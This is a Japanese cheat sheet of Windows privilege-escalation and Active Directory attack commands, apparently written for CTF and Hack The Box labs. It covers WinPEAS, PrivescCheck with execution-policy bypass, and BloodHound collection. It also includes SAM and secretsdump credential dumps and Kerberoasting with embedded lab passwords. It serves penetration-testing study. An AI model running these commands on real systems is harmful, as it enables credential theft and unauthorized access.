## 目次
1. [基本チェック](#基本チェック)
2. [自動化スクリプト](#自動化スクリプト)
    - [WinPeas](#winpeas)
    - [Jaws-enum.ps1](#jaws-enumps1)
    - [PowerUp.ps1](#powerupps1)
    - [PrivescCheck.ps1](#privesccheckps1)
3. [crackmapexec](#crackmapexec)
4. [Bloodhound](#bloodhound)
5. [Impacket](#impacket)
    - [secretdump](#secretdump)
    - [GetUserSPNs](#getuserspns)
6. [WinPEAS](#winpeas)
    - [AutoLogin](#autologin)
    - [パラメータ例](#パラメータ例)
7. [Sherrock.ps1](#sherrockps1)

---

## 基本チェック

```bash
whoami
whoami /priv
net user username
net user /group
net user /domain
host
hostname
systeminfo
```

> **注:** `hostfix`はWindows Updateの履歴を指します。

---

## 自動化スクリプト

## WinPeas
- [WinPeasのダウンロード](https://github.com/peass-ng/PEASS-ng/releases/tag/20230618-1fa055b6)
- コマンド: `winpeas.bat`

## Jaws-enum.ps1

## PowerUp.ps1

## PrivescCheck.ps1
- [PrivescCheckのダウンロード](https://github.com/itm4n/PrivescCheck)

**基本チェックのみ:**
```bash
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

**拡張チェック + すべてのレポート:**
```bash
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML
```

**オールインワンコマンド:**
```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,CSV,HTML,XML"
```

---

## crackmapexec

```bash
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
```

---

## Bloodhound

### 初期侵入後の調査
```bash
sudo neo4j console
```
- メニューからBloodhoundを起動
  - ※コマンドだとなぜかエラーになる
- 被害者マシンで`SharpHound.exe`または`SharpHound.ps1`を実行
- ZIPファイルが作成されるのでダウンロード
- 解凍せずにBloodhoundにアップロード
- すでに権限を奪えているユーザーは「Mark User as High Value」にチェック

### リモートの場合
```bash
bloodhound-python
```
- Dockerでも可能

---

### Impacket

#### secretdump
```bash
impacket-secretsdump htb/svc-alfresco:s3rvice@10.10.10.161
```

#### GetUserSPNs
```bash
impacket-GetUserSPNs -request -dc-ip active.htb active.htb/svc_tgs
```
- ※ユーザパスワードが必要

---

## WinPEAS

## AutoLogin

## パラメータ例
ヘルプを表示
```bash
winpeas.exe -h
```
すべてのチェックを実行（ただし、LOLBASとlinpeas.shの追加の遅いチェックは除く） (CTFs用)
```bash
winpeas.exe
```
systeminfoとuserinfoのチェックのみ実行
```bash
winpeas.exe systeminfo userinfo
```
出力をカラーにしない
```bash
winpeas.exe notcolor
```
ドメイン情報も列挙
```bash
winpeas.exe domain
```
各テスト間でユーザー入力を待機
```bash
winpeas.exe wait
```
追加のデバッグ情報を表示
```bash
winpeas.exe debug
```
出力を標準出力ではなくout.txtにログ
```bash
winpeas.exe log
```
# 追加のlinpeasチェックを実行（デフォルトのWSLディストリビューションでlinpeas.shを実行）カスタムURLでlinpeas.shを実行（指定がない場合、デフォルトURLは: https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh）
```bash
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh
```
追加のLOLBAS検索チェックも実行
```bash
winpeas.exe -lolbas
```

---

## Sherrock.ps1

- PowerShell周りの脆弱性列挙ツール
